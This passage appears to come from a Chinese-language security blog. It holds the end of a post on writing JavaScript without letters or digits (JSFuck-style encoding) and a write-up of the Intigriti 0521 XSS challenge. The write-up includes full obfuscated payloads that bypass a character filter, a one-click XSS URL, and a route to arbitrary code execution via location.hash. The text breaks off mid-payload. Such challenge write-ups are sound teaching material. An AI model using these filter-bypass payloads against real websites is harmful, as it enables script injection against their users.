((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+(([][&#123;&#125;]+'')[((+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((!![] + '')[((+!![]))])+((!![] + '')[((+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((''+&#123;&#125;)[((+!![]))])+((!![] + '')[((+!![]))]) 把這結果丟去 console 執行，發現得到的值就是 constructor 沒錯。所以綜合以上程式，回到我們剛剛那一段：(()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;return btoa(2)[1]&#39;)()，要得到轉換完的結果，就是： const con = transformNumber(transformString('constructor')) const fn = transformNumber(transformString('return btoa(2)[1]')) const result = `(()=>&#123;&#125;)[$&#123;con&#125;]($&#123;fn&#125;)()` console.log(result) 結果超級長我就先不貼了，但確實能得到一個字串 g。 在繼續往下之前，先讓我們把程式改一下，新增一個能夠直接轉換程式碼的函式： function transform(code) &#123; const con = transformNumber(transformString('constructor')) const fn = transformNumber(transformString(code)) const result = `(()=>&#123;&#125;)[$&#123;con&#125;]($&#123;fn&#125;)()` return result; &#125; console.log(transform('return btoa(2)[1]')) 好，做到這邊其實我們已經接近終點了，只差有一件事情沒有解決，那就是 btoa 其實是 WebAPI，瀏覽器才有，Node.js 並沒有這函式，所以想要解得更漂亮，就必須找到其他方式來產生 g 這個字元。 可以回憶一下一開始所提的，用 function.constructor 可以拿到 function constructor，所以以此類推，用 &#39;&#39;[&#39;constructor&#39;] 可以拿到 string constructor，只要再加上一個字串，就可以拿到 string constructor 的內容了！ 像是這樣：&#39;&#39;[&#39;constructor&#39;] + &#39;&#39;，得到的結果是：&quot;function String() &#123; [native code] &#125;&quot;，一瞬間多了堆字串可以用，而我們朝思暮想的 g 就是：(&#39;&#39;[&#39;constructor&#39;] + &#39;&#39;)[14]。 由於我們的轉換器目前只能支援一個位數的數字（因為做起來簡單），我們改成：(&#39;&#39;[&#39;constructor&#39;] + &#39;&#39;)[7+7]，可以寫成這樣： mapping[&#39;g&#39;] &#x3D; transform(&#96;return (&#39;&#39;[&#39;constructor&#39;] + &#39;&#39;)[7+7]&#96;) 結合所有努力經歷過千辛萬苦之後，我們終於湊出了最麻煩的 g 這個字元，結合我們剛剛寫好的轉換器，就可以順利產生 console.log(1) 去除掉字母與數字過後的版本： const mapping = &#123; a: \"(![] + '')[1]\", b: \"(''+&#123;&#125;)[2]\", c: \"(''+&#123;&#125;)[5]\", d: \"([][&#123;&#125;]+'')[2]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", i: \"([][&#123;&#125;]+'')[5]\", j: \"(''+&#123;&#125;)[3]\", l: \"(![] + '')[2]\", n: \"([][&#123;&#125;]+'')[1]\", o: \"(''+&#123;&#125;)[1]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; const one = '(+!![])' const zero = '(+[])' function transformString(input) &#123; return input.split('').map(char => &#123; // 先假設數字只會有個位數，比較好做轉換 if (/[0-9]/.test(char)) &#123; if (char === '0') return zero return Array(+char).fill().map(_ => one).join('+') &#125; if (/[a-zA-Z]/.test(char)) &#123; return mapping[char] &#125; return `\"$&#123;char&#125;\"` &#125;) // 加上 () 保證執行順序 .map(char => `($&#123;char&#125;)`) .join('+') &#125; function transformNumber(input) &#123; return input.split('').map(char => &#123; // 先假設數字只會有個位數，比較好做轉換 if (/[0-9]/.test(char)) &#123; if (char === '0') return zero let newChar = Array(+char).fill().map(_ => one).join('+') return`($&#123;newChar&#125;)` &#125; return char &#125;) .join('') &#125; function transform(code) &#123; const con = transformNumber(transformString('constructor')) const fn = transformNumber(transformString(code)) const result = `(()=>&#123;&#125;)[$&#123;con&#125;]($&#123;fn&#125;)()` return result; &#125; mapping['g'] = transform(`return (''['constructor'] + '')[7+7]`) console.log(transform('console.log(1)')) 最後產生出來的程式碼： (()=>&#123;&#125;)[((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+(([][&#123;&#125;]+'')[((+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((!![] + '')[((+!![]))])+((!![] + '')[((+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((''+&#123;&#125;)[((+!![]))])+((!![] + '')[((+!![]))])](((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+(([][&#123;&#125;]+'')[((+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+((![] + '')[((+!![])+(+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![])+(+!![]))])+(\".\")+((![] + '')[((+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+((()=>&#123;&#125;)[((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+(([][&#123;&#125;]+'')[((+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((!![] + '')[((+!![]))])+((!![] + '')[((+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((''+&#123;&#125;)[((+!![]))])+((!![] + '')[((+!![]))])](((!![] + '')[((+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((!![] + '')[((+!![])+(+!![]))])+((!![] + '')[((+!![]))])+(([][&#123;&#125;]+'')[((+!![]))])+(\" \")+(\"(\")+(\"'\")+(\"'\")+(\"[\")+(\"'\")+((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![]))])+(([][&#123;&#125;]+'')[((+!![]))])+((![] + '')[((+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((!![] + '')[((+!![]))])+((!![] + '')[((+!![])+(+!![]))])+((''+&#123;&#125;)[((+!![])+(+!![])+(+!![])+(+!![])+(+!![]))])+((!![] + '')[(+[])])+((''+&#123;&#125;)[((+!![]))])+((!![] + '')[((+!![]))])+(\"'\")+(\"]\")+(\" \")+(\"+\")+(\" \")+(\"'\")+(\"'\")+(\")\")+(\"[\")+((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![]))+(\"+\")+((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![]))+(\"]\"))())+(\"(\")+((+!![]))+((+!![])+(+!![]))+((+!![])+(+!![])+(+!![]))+(\")\"))() 至此，我們用了 1800 個字元，成功製造出只有：[, ], (, ), &#123;, &#125;, &quot;, &#39;, +, !, =, &gt; 這 12 個字元的程式，並且能夠順利執行 console.log(1)。 而因為我們已經可以順利拿到 String 這幾個字了，所以就可以用之前提過的進位轉換的方法，得到任意小寫字元，像是這樣： mapping['S'] = transform(`return (''['constructor'] + '')[9]`) mapping['g'] = transform(`return (''['constructor'] + '')[7+7]`) console.log(transform('return (35).toString(36)')) // z 那要怎麼拿到任意大寫字元，或甚至任意字元呢？我也有想到幾種方式。 如果想拿到任意字元，可以透過 String.fromCharCode，或是寫成另一種形式：&quot;&quot;[&#39;constructor&#39;][&#39;fromCharCode&#39;]，就可以拿到任意字元。可是在這之前要先想辦法拿到大寫的 C，這個就要再想一下怎麼做了。 除了這條路，還有另外一條，那就是靠編碼，例如說 &#39;\\u0043&#39; 其實就是大寫的 C 了，所以我原本以為可以透過這種方法來湊，但我試了一下是不行的，像是 console.log(&quot;\\u0043&quot;) 會印出 C 沒錯，但是 console.log((&quot;\\u00&quot; + &quot;43&quot;)) 就會直接噴一個錯誤給你，看來編碼沒有辦法這樣拼起來（仔細想想發現滿合理的）。 總結其實我以前有寫過一篇：讓 JavaSript 難以閱讀：jsfuck 與 aaencode，在講的就是同一件事，不過以前我只有稍微整理一下，這次則是自己親自下去試過，感覺更不一樣。 最後寫出來的那個轉換的函式其實並不完整，沒有辦法執行任意程式碼，沒有繼續做完是因為 jsfuck 這個 library 已經寫得很清楚了，在 README 裡面有詳細描述它的轉換過程，而且最後只用了 6 個字元而已，真的很佩服。 在它的程式碼當中也可以看出他的轉換是怎麼做的，大寫 C 的部分是用一個在 String 身上叫做 italics 的函式，可以產生出 &lt;i&gt;&lt;/i&gt;，產生出以後再呼叫 escape 去做跳脫，就會得到 %3Ci%3E%3C/i%3E，就有大寫 C 了。 有些人可能會想說平常程式碼寫得好好的，幹嘛這樣搞自己，但這樣做的重點其實不在於最後的結果，而是在訓練幾個東西，像是： 對於程式語言的熟悉度，我們用了很多型別轉換跟內建方法來湊東西，可能有些是你根本沒聽過的 解決問題，縮小範圍的能力，從如何把字串當作函式執行，再到湊出數字跟字串，一步步縮小題目，子問題解決之後原問題就解決了 總之呢，以上是我針對這一題的一些解題心路歷程，有什麼有趣的解法也歡迎留言讓我知道（例如說其他種拿到大寫字母 C 的做法），感謝！","link":"/2020/12/01/write-conosle-log-1-without-alphanumeric/"},{"title":"Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼","text":"前言Intigriti 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 alert(document.domain)，解出來之後把結果透過 Intigriti 平台回報，最後會隨機抽 3 個解掉的人得到他們自己商店的優惠券。 上個月的挑戰因為解出來的人不多，所以我有幸運抽到 50 歐元的優惠券，其實很划算，因為商店賣的東西其實都滿便宜的，我買了一件 t-shirt + 兩頂帽子再加國際運費，大概 45 歐元左右。 不過這種獎品就是靠運氣啦，還是解題好玩比較重要。 挑戰網址在這邊：https://challenge-0521.intigriti.io/ 程式碼分析 解題的第一步就是分析一下它的程式碼，先了解一下這整個題目的運作為何。首頁這一頁看起來沒什麼東西，比較值得注意的只有一個網址是 ./captcha.php 的 iframe，直接來看看裡面是什麼： &lt;body> &lt;form id=\"captcha\"> &lt;div id=\"input-fields\"> &lt;span id=\"a\">&lt;/span> &lt;span id=\"b\">+&lt;/span> &lt;input id=\"c\" type=\"text\" size=\"4\" value=\"\" required/> = &lt;span id=\"d\">&lt;/span> &lt;progress id=\"e\" value=\"0\" max=\"100\" style=\"display:none\">&lt;/progress> &lt;/div> &lt;input type=\"submit\" id=\"f\"/> &lt;input type=\"button\" onclick=\"setNewNumber()\" value=\"Retry\" id=\"g\"/> &lt;/form> &lt;/body> &lt;script> const a = document.querySelector(\"#a\"); const c = document.querySelector(\"#c\"); const b = document.querySelector(\"#b\"); const d = document.querySelector(\"#d\"); window.onload = function()&#123; setNewNumber(); document.getElementById(\"captcha\").onsubmit = function(e)&#123; e.preventDefault(); loadCalc(0); &#125;; &#125; function loadCalc(pVal)&#123; document.getElementsByTagName(\"progress\")[0].style.display = \"block\"; document.getElementsByTagName(\"progress\")[0].value = pVal; if(pVal == 100)&#123; calc(); &#125; else&#123; window.setTimeout(function()&#123;loadCalc(pVal + 1)&#125;, 10); &#125; &#125; function setNewNumber() &#123; document.getElementsByTagName(\"progress\")[0].style.display = \"none\"; var dValue = Math.round(Math.random()*1000); d.innerText = dValue; a.innerText = Math.round(Math.random()* dValue); &#125; function calc() &#123; const operation = a.innerText + b.innerText + c.value; if (!operation.match(/[a-df-z&lt;>()!\\\\='\"]/gi)) &#123; // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant) if (d.innerText == eval(operation)) &#123; alert(\"🚫🤖 Congratulations, you're not a robot!\"); &#125; else &#123; alert(\"🤖 Sorry to break the news to you, but you are a robot!\"); &#125; setNewNumber(); &#125; c.value = \"\"; &#125; &lt;/script> 這邊有幾個 input，然後使用者按下送出時會把輸入的 c.value 丟到 eval 去執行，但有限定字元，不能使用：a-df-z&lt;&gt;()!\\=&#39;&quot;，在英文字母裡面只有 e 是可以用的。 因此這題的目標就很明顯了，是要繞過這個字元的限制，然後透過那個 eval 幫我們執行 alert(document.domain) 全面啟動（先寫在前面，這篇的程式碼你會看到有些 &#96; 是用全形，這是因為不這樣的話 markdown parser 會壞掉） 有關繞過字元限制，之前我有寫了一篇：如何不用英文字母與數字寫出 console.log(1)？，沒想到這次就派上用場了。 舉例來說，0/0 可以產生 NaN，所以 `$&#123;0/0&#125;`[1] 就可以拿到字串 a。只要用類似的技巧，應該就可以產生出我們想要的所有字元。 但這題難的地方我覺得不在這，而是一開始在思考這題的時候腦袋容易打結，因為會分不太清楚什麼程式碼會直接被執行，什麼程式碼又不會。 舉例來說，就算費盡千辛萬苦拼出了目標字串好了，丟到 eval 去之後其實結果跟你想像中不太一樣，因為結構大概會像這樣：eval(&#39;&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1)&quot;&#39;) 最後的結果會是字串：alert(1)，而不是直接執行 alert(1)，因為你在做的只是把想執行的程式碼拼出來，而 eval 只是幫你拼起來而已。那如果再把 eval 拼出來呢？ eval(&#39;&quot;eval(a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1))&quot;&#39; 這樣也是沒用的，也只會出現字串的 eval 而已。之所以這樣不行，是因為你拼的東西是字串中的字串。舉例來說，請看下面這兩段程式碼： eval(&#39;alert(1)&#39;)eval(&#39;&quot;alert(1)&quot;&#39;) 前者會跳出 alert，後者會輸出字串 alert。這就是因為後者是：「字串中的字串」。如果用字串拼接的方式，就一定會這樣。 所以如果需要執行程式碼的話，我們一定要有一些東西是不需要拼接的，在 JS 裡面可以把字串當作程式碼執行的有： eval function constructor setTimeout setInterval location 這裡面符合我們需求的，就是 function constructor 了！ 為什麼這樣說呢？因為我們可以不直接透過字串存取到這個東西！先簡單講一下 function constructor，就是 Function() 這個東西，可以動態產生函式。 然後 Function 就是 Function.prototype.constructor，所以可以利用 prototype chain 加上陣列來存取到：[][&#39;constructor&#39;][&#39;constructor&#39;] === Function // true 有了這個之後，就可以動態建立 function 並且執行了！ 像這樣：[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)() 那為什麼這樣子放進 eval 之後就可以呢？因為 [] 並不是用字串組成的，所以放進 eval 會是這樣：eval(&quot;[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()&quot;) 這樣一來，就可以在 eval 裡面透過 function constructor 去動態執行程式碼了，這就是這個章節的標題「全面啟動」的意思，一層還有一層。 不過除了要找出替代字串以外，還有一個問題，那就是函式呼叫不能使用 ()，這該怎麼辦呢？ Tagged templates有用過 React 中的 styled components 的話，對這個語法應該不陌生： const Box = styled.div` background: red; ` 其實 styled.div 是一個 function，然後用反引號來呼叫 function。沒錯，反引號也是可以呼叫函式的，但要注意的是參數的傳遞會跟你想的不太一樣。 直接做個簡單示範就知道了： function noop(...args) &#123; console.log(args) &#125; noop`1` // [[\"1\"]] noop`$&#123;'abc'&#125;`// [[\"\", \"\"], \"abc\"] noop`1$&#123;'abc'&#125;2` // [[\"1\", \"2\"], \"abc\"] noop`1$&#123;'a'&#125;2$&#123;'b'&#125;3$&#123;'c'&#125;` // [[\"1\", \"2\", \"3\", \"\"], \"a\", \"b\", \"c\"] 用反引號來呼叫函式的話，第一個參數會是一個陣列，裡面是所有一般的字串，隔開的標準是中間有 $&#123;&#125;，而接下來第二個參數以後都是你放在 $&#123;&#125; 裡的內容。 更多範例可參考：[筆記] JavaScript ES6 中的模版字符串（template literals）和標籤模版（tagged template） 把我們上面的程式碼用反引號改寫會變這樣： []['constructor']['constructor']`$&#123;'alert(1)'&#125;``｀ 但這樣的話如果你丟去執行，會發現有錯。因為根據我們上面所說的，這樣寫的話傳去 function constructor 的參數會是：[&quot;&quot;], &#39;alert(1)&#39;，第一個參數是一個含有空字串的陣列。 而 function constructor 除了最後一個參數之外，其他都會被當作要動態新增的函式的參數，例如說 Function(&#39;a&#39;, &#39;b&#39;, &#39;return a+b&#39;) 就是： function (a, b) &#123; return a+b &#125; 所以第一個參數給空字串是行不通的，加一個變數就行了，例如說題目允許的 e 或者是 _： []['constructor']['constructor']`_$&#123;'alert(1)'&#125;``｀ // 產生出的函式 function anonymous(_,) &#123; alert(1) &#125; 這樣就能順利執行程式碼了，因此最後剩下的就只有拼出 constructor 跟 alert(document.domain) 了 字串拼拼樂除了我開頭提到的文章：如何不用英文字母與數字寫出 console.log(1)？之外，jsfuck 的程式碼也有很多可以參考的地方。 底下是我用的幾個： 1. `$&#123;``+&#123;&#125;&#125;` => \"[object Object]\" 2. `$&#123;``[0]&#125;` => \"undefined\" 3. `$&#123;e&#125;` => \"[object HTMLProgressElement]\" 4. `$&#123;0/0&#125;` => \"NaN\" 我們可以從上面這些組合中，找到所有需要的字元。接下來只差最後兩個了，就是 ()，我們必須也用拼的拼出這兩個字元才行。 這要怎麼拿到呢？在 JS 裡面把 function 變成字串的話，就會是整個 function 的內容，像這樣： `$&#123;[]['constructor']&#125;` => \"function Array() &#123; [native code] &#125;\" 可以透過這樣子拿到這裡面的 () 這兩個字元。 結合以上的技巧，我自己寫了一個簡單的小程式去產出最終的結果： const mapping = &#123; a: '`$&#123;0/0&#125;`[1]', c: '`$&#123;``+&#123;&#125;&#125;`[5]', d: '`$&#123;``[0]&#125;`[2]', e: '`e`', i: '`$&#123;``[0]&#125;`[5]', l: '`$&#123;e&#125;`[21]', m: '`$&#123;e&#125;`[23]', n: '`$&#123;``[0]&#125;`[1]', o: '`$&#123;``+&#123;&#125;&#125;`[1]', r: '`$&#123;e&#125;`[13]', s: '`$&#123;e&#125;`[18]', t: '`$&#123;``+&#123;&#125;&#125;`[6]', u: '`$&#123;``[0]&#125;`[0]', \".\": '`.`' &#125; function getString(str) &#123; return str.split('').map(c => mapping[c] || 'error:' + c).join('+') &#125; const cons = getString('constructor') mapping['('] = '`$&#123;[][' + cons + ']&#125;`[14]' mapping[')'] = '`$&#123;[][' + cons + ']&#125;`[15]' const ans = \"[][\" + getString('constructor') + \"][\"+ getString('constructor') + \"]`_$&#123;\" + getString('alert(document.domain)') + \"&#125;```\" console.log(ans) output(長度 851): [][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]`_$&#123;`$&#123;0/0&#125;`[1]+`$&#123;e&#125;`[21]+`e`+`$&#123;e&#125;`[13]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[14]+`$&#123;``[0]&#125;`[2]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``[0]&#125;`[0]+`$&#123;e&#125;`[23]+`e`+`$&#123;``[0]&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[6]+`.`+`$&#123;``[0]&#125;`[2]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[23]+`$&#123;0/0&#125;`[1]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[15]&#125;`` ` 把上面這整串貼到網頁上的 input 然後按下提交，就會看到 alert 跳出來囉！ 做到這邊之後我就很開心地去送答案，結果得到了一個回覆，跟我說這是 self-XSS，提示我說可以多往 php 那邊去研究一點。 沒錯，我都忘記這是一個 self-XSS 了，因為需要自己把這串 payload 貼在 input 上面送出，就有點像是使用者必須自己把惡意程式碼貼過來一樣，這種通常沒辦法構成具有嚴重性的漏洞。 因此我就往 PHP 那邊去看，隨便試了一下發現 c=xxx 的內容會直接反映在 c.value 上，所以只要把上面那一串放到網址上面去就好了，變成： https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;e&#96;%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[14]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[2]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;.&#96;%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[2]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[15]&#125;&#96;&#96;+&#96; 這樣子使用者點了網址之後 payload 就會自動填好，只要按按鈕就可以觸發。於是我們把 self-XSS 變成了 one-click XSS，點個按鈕就會中招。 做到這邊其實就通過這題了，但因為還有時間，所以我還想再研究更多東西。 執行任意程式碼只是執行固定的程式碼不太好玩，有沒有可能執行任意程式碼？像是這種任意程式碼執行通常都會透過幾個方法把程式碼帶進去，例如說： window.name iframe + top.name location.hash 這邊前兩者都需要自己再做另一個網頁，只有 location.hash 不需要，因此這邊就先以這個作法為主吧！ 我們需要湊出的字串是： []['constructor']['constructor']`_$&#123;'eval(location.hash.slice(1))'&#125;`` ` 這樣只要讓網址最後面是：#alert(document.domain)，就可以達成一樣的效果了。 新的字元組合，缺少的只有兩個：v 跟 h。 這兩個其實不太好找，因為比較好找的已經都被我們找完了。那還有哪裡可以找呢？ 首先是 v 的部分，其實可以把原生的 function 變成 string，就能拿到 [native code] 這個字串。但是在 Chrome 上與 Firefox 上的輸出不太一樣，以 RegExp 為例， Chrome 的輸出是：function RegExp() &#123; [native code] &#125;Firefox 的輸出是：function RegExp() &#123;\\n [native code]\\n&#125; Firefox 的輸出會換行而 Chrome 不會，這就造成了字元 index 的差異，所以沒辦法跨瀏覽器取得 v 這個字。不過我們先不管這個，先來看 h 好了。 h 一樣也是不容易取得，但如果我們能組出：17[&#39;toString&#39;]`36`，其實就能拿到 h。 因為上面的程式碼就是把 17 這個數字轉成 36 進位，這樣就可以拿到 h，因為 h 是第 8 個英文字母（9 個數字 + 第 8 個英文字母 &#x3D; 17）。 那這個大寫的 S 怎麼拿呢？String constructor 可以拿到： ``['constructor'] + '' // output // \"function String() &#123; [native code] &#125;\" 而且一旦我們可以用 toString 的這個技巧，其實任何小寫英文字母都可以拿到了，當然也包含前面所說的 v。 詳細過程我就不示範了，把程式改一下就好，最後的結果是（1925 個字）： [][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]`_$&#123;`e`+31[`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[9]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[15]]`36`+`$&#1